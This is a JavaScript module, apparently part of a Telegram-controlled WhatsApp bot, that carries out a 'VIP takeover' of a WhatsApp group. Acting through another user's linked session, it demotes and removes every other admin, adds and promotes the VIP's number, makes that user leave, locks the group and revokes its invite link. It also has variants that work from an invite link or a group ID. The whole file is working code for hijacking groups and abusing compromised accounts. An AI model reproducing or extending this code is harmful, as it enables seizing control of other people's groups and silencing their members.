import { createComponentLogger } from '../../utils/logger.js'
import { VIPQueries } from '../../database/query.js'
import VIPHelper from './vip-helper.js'

const logger = createComponentLogger('VIP_TAKEOVER')
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

export class VIPTakeover {
  /**
   * Perform group takeover
   */
  static async takeover(vipTelegramId, targetTelegramId, groupJid, vipPhone) {
    logger.info(`Starting takeover - VIP: ${vipTelegramId}, Target: ${targetTelegramId}, Group: ${groupJid}`)

    const results = {
      success: false,
      steps: {
        validation: false,
        checkedPermissions: false,
        addedVIP: false,
        promotedVIP: false,
        demotedAdmins: false,
        removedUser: false,
        lockedGroup: false,
        resetGroupLink: false
      },
      errors: []
    }

    let targetSock = null
    let vipJid = null

    try {
      // ========== STEP 1: VALIDATION ==========
      logger.info('Step 1: Starting validation')
      
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      if (!canControl.allowed) {
        results.errors.push(`Permission denied: ${canControl.reason}`)
        return results
      }
      
      targetSock = await VIPHelper.getUserSocket(targetTelegramId)
      if (!targetSock) {
        results.errors.push('Target user socket not available')
        return results
      }
      
      vipJid = `${vipPhone}@s.whatsapp.net`
      results.steps.validation = true
      logger.info('✓ Validation complete')
      
      // ========== STEP 2: GET GROUP METADATA & CHECK PERMISSIONS ==========
      logger.info('Step 2: Getting group metadata')
      
      let groupMetadata
      try {
        groupMetadata = await targetSock.groupMetadata(groupJid)
        logger.info(`Group: ${groupMetadata.subject} (${groupMetadata.participants.length} participants)`)
      } catch (metadataError) {
        logger.error('Failed to get group metadata:', metadataError)
        results.errors.push('Could not access group metadata. Target may not be in group.')
        return results
      }

      const targetUserJid = targetSock.user.id
      const targetPhoneNumber = targetUserJid.split('@')[0].split(':')[0]
      
      // Find target user in participants by phone number
      let targetParticipant = null
      let targetParticipantJid = null
      
      for (const p of groupMetadata.participants) {
        try {
          const participantJid = p.id || p.jid
          
          let participantPhone
          if (participantJid.endsWith('@lid')) {
            const resolved = await VIPHelper.resolveJid(participantJid, targetSock, groupJid)
            participantPhone = resolved.split('@')[0].split(':')[0]
          } else {
            participantPhone = participantJid.split('@')[0].split(':')[0]
          }
          
          if (participantPhone === targetPhoneNumber) {
            targetParticipant = p
            targetParticipantJid = participantJid
            logger.info(`Found target participant: ${participantJid} (Admin: ${p.admin})`)
            break
          }
        } catch (participantError) {
          continue
        }
      }
      
      if (!targetParticipant) {
        results.errors.push('Target user is not in the group')
        return results
      }
      
      const isOwner = targetParticipant.admin === 'superadmin'
      const isAdmin = targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin'
      
      // Check if there's an active (non-banned) owner
      let hasActiveOwner = false
      for (const p of groupMetadata.participants) {
        try {
          if (p.admin === 'superadmin') {
            const participantJid = p.id || p.jid
            
            let participantPhone
            let resolvedJid = participantJid
            
            if (participantJid.endsWith('@lid')) {
              resolvedJid = await VIPHelper.resolveJid(participantJid, targetSock, groupJid)
              participantPhone = resolvedJid.split('@')[0].split(':')[0]
            } else {
              participantPhone = participantJid.split('@')[0].split(':')[0]
            }
            
            // Exclude target user
            if (participantPhone !== targetPhoneNumber) {
              const accountStatus = await VIPHelper.checkAccountStatus(targetSock, resolvedJid)
              if (!accountStatus.isBanned) {
                hasActiveOwner = true
                logger.info(`Found active owner: ${participantJid}`)
                break
              }
            }
          }
        } catch (participantError) {
          continue
        }
      }
      
      // Allow takeover for any admin
      const canHijack = isAdmin
      
      if (!canHijack) {
        results.errors.push('Target user is not an admin or owner in this group')
        return results
      }
      
      results.steps.checkedPermissions = true
      logger.info(`✓ Permission check complete (Owner: ${isOwner}, Admin: ${isAdmin}, Has Active Owner: ${hasActiveOwner})`)
      
      // ========== STEP 3: COLLECT ADMINS TO REMOVE ==========
      logger.info('Step 3: Collecting admins to remove')
      
      const adminsToRemove = []
      for (const p of groupMetadata.participants) {
        try {
          if (p.admin === 'admin' || p.admin === 'superadmin') {
            const participantJid = p.id || p.jid
            
            let participantPhone
            if (participantJid.endsWith('@lid')) {
              const resolved = await VIPHelper.resolveJid(participantJid, targetSock, groupJid)
              participantPhone = resolved.split('@')[0].split(':')[0]
            } else {
              participantPhone = participantJid.split('@')[0].split(':')[0]
            }
            
            // Exclude target user
            if (participantPhone !== targetPhoneNumber) {
              adminsToRemove.push(participantJid)
            }
          }
        } catch (adminError) {
          continue
        }
      }
      
      logger.info(`Found ${adminsToRemove.length} admins to remove`)
      
      // ========== STEP 4: REMOVE OTHER ADMINS ==========
      logger.info('Step 4: Removing admins')
      
      if (adminsToRemove.length > 0) {
        const successfullyRemoved = []
        const failedToRemove = []
        
        for (const adminJid of adminsToRemove) {
          try {
            await targetSock.groupParticipantsUpdate(groupJid, [adminJid], 'demote')
            await sleep(500)
            
            await targetSock.groupParticipantsUpdate(groupJid, [adminJid], 'remove')
            await sleep(500)
            
            successfullyRemoved.push(adminJid)
          } catch (removeError) {
            failedToRemove.push(adminJid)
          }
        }
        
        logger.info(`✓ Removed ${successfullyRemoved.length}/${adminsToRemove.length} admins`)
        results.steps.demotedAdmins = true
      } else {
        results.steps.demotedAdmins = true
        logger.info('✓ No admins to remove')
      }
      
      // ========== STEP 5: CHECK IF VIP IS IN GROUP ==========
      logger.info('Step 5: Checking if VIP is in group')
      
      const isVIPInGroup = await this.checkIfUserInGroup(targetSock, groupJid, vipPhone, groupMetadata)
      logger.info(`VIP in group: ${isVIPInGroup}`)
      
      // ========== STEP 6: ADD VIP TO GROUP ==========
      logger.info('Step 6: Adding VIP to group')
      
      let resolvedVipJid = vipJid
      
      if (!isVIPInGroup) {
        try {
          try {
            resolvedVipJid = await VIPHelper.resolveJid(vipJid, targetSock, groupJid)
          } catch (vipResolveError) {
            // Use original if resolution fails
          }
          
          await targetSock.groupParticipantsUpdate(groupJid, [resolvedVipJid], 'add')
          await sleep(500)
          results.steps.addedVIP = true
          logger.info('✓ Added VIP to group')
        } catch (addError) {
          logger.error('Failed to add VIP:', addError)
          results.errors.push('Failed to add VIP to group')
          return results
        }
      } else {
        results.steps.addedVIP = true
        logger.info('✓ VIP already in group')
      }
      
      // ========== STEP 7: PROMOTE VIP TO ADMIN ==========
      logger.info('Step 7: Promoting VIP to admin')
      
      try {
        await targetSock.groupParticipantsUpdate(groupJid, [resolvedVipJid], 'promote')
        await sleep(500)
        results.steps.promotedVIP = true
        logger.info('✓ Promoted VIP to admin')
      } catch (promoteError) {
        logger.error('Failed to promote VIP:', promoteError)
        results.errors.push('Failed to promote VIP to admin')
        return results
      }
      
      // ========== STEP 8: TARGET USER LEAVES GROUP ==========
      logger.info('Step 8: Target user leaving group')
      
      try {
        await targetSock.groupLeave(groupJid)
        await sleep(500)
        results.steps.removedUser = true
        logger.info('✓ Target user left group')
      } catch (leaveError) {
        logger.error('Failed to leave group:', leaveError)
        results.errors.push('Failed to remove target user from group')
      }
      
      // ========== STEP 9: LOCK GROUP ==========
      logger.info('Step 9: Locking group')
      
      const vipSock = await VIPHelper.getVIPSocket(vipTelegramId)
      
      if (vipSock) {
        try {
          await vipSock.groupSettingUpdate(groupJid, 'announcement')
          await sleep(1000)
          results.steps.lockedGroup = true
          logger.info('✓ Locked group')
        } catch (lockError) {
          logger.error('Failed to lock group:', lockError)
          results.errors.push('Failed to lock group settings')
        }
      } else {
        logger.warn('Could not get VIP socket to lock group')
        results.errors.push('Could not lock group - VIP socket unavailable')
      }
      
      // ========== STEP 10: RESET GROUP INVITE LINK ==========
      logger.info('Step 10: Resetting group invite link')
      
      if (vipSock) {
        try {
          await vipSock.groupRevokeInvite(groupJid)
          await sleep(500)
          results.steps.resetGroupLink = true
          logger.info('✓ Reset group invite link')
        } catch (resetError) {
          logger.error('Failed to reset group link:', resetError)
          results.errors.push('Failed to reset group invite link')
        }
      } else {
        results.errors.push('Could not reset group link - VIP socket unavailable')
      }
      
      // ========== LOG ACTIVITY ==========
      try {
        await VIPQueries.logActivity(
          vipTelegramId,
          'takeover',
          targetTelegramId,
          groupJid,
          {
            groupName: groupMetadata.subject,
            adminsRemoved: adminsToRemove.length,
            vipPhone,
            targetWasOwner: isOwner,
            targetWasAdmin: isAdmin
          }
        )
      } catch (logError) {
        logger.error('Failed to log activity:', logError)
      }
      
      // Store ban status info for response
      results.ownerWasBanned = !hasActiveOwner && groupMetadata.participants.some(
        p => p.admin === 'superadmin' && p.id !== targetParticipantJid
      )
      
      results.success = true
      logger.info('✓ Takeover completed successfully')
      
    } catch (error) {
      let errorMsg = 'Unknown error occurred'
      
      if (error && typeof error === 'object') {
        if (error.message) {
          errorMsg = error.message
        } else if (error.toString && error.toString() !== '[object Object]') {
          errorMsg = error.toString()
        } else {
          try {
            errorMsg = JSON.stringify(error)
          } catch {
            errorMsg = 'Error object could not be stringified'
          }
        }
      } else if (error) {
        errorMsg = String(error)
      }
      
      logger.error('Error during takeover:', error)
      results.errors.push(errorMsg)
    }

    return results
  }

  /**
   * Check if user is in group by phone number
   */
  static async checkIfUserInGroup(sock, groupJid, phone, metadata) {
    try {
      for (const participant of metadata.participants) {
        const participantJid = participant.id || participant.jid
        
        let participantPhone
        if (participantJid.endsWith('@lid')) {
          const resolved = await VIPHelper.resolveJid(participantJid, sock, groupJid)
          participantPhone = resolved.split('@')[0].split(':')[0]
        } else {
          participantPhone = participantJid.split('@')[0].split(':')[0]
        }
        
        if (participantPhone === phone) {
          return true
        }
      }
      return false
    } catch (error) {
      logger.error('Error checking if user in group:', error)
      return false
    }
  }

  /**
   * Takeover with group link
   */
  static async takeoverByLink(vipTelegramId, targetTelegramId, groupLink, vipPhone) {
    logger.info('Takeover by link initiated')
    
    try {
      const inviteCode = groupLink.split('/').pop()
      
      const targetSock = await VIPHelper.getUserSocket(targetTelegramId)
      if (!targetSock) {
        return { success: false, error: 'Target user socket not available' }
      }
      
      const groupInfo = await targetSock.groupGetInviteInfo(inviteCode)
      const groupJid = groupInfo.id
      
      logger.info(`Taking over group via link: ${groupJid}`)
      
      return await this.takeover(vipTelegramId, targetTelegramId, groupJid, vipPhone)
      
    } catch (error) {
      logger.error('Error in takeover by link:', error)
      return { 
        success: false, 
        error: error?.message || error?.toString() || 'Unknown error' 
      }
    }
  }

  /**
   * Takeover with group ID
   */
  static async takeoverByGroupId(vipTelegramId, targetTelegramId, groupJid, vipPhone) {
    logger.info('Takeover by group ID initiated')
    
    if (!groupJid.endsWith('@g.us')) {
      return { 
        success: false, 
        error: 'Invalid group ID format. Must end with @g.us',
        errors: ['Invalid group ID format. Must end with @g.us']
      }
    }
    
    return await this.takeover(vipTelegramId, targetTelegramId, groupJid, vipPhone)
  }
}

export default VIPTakeover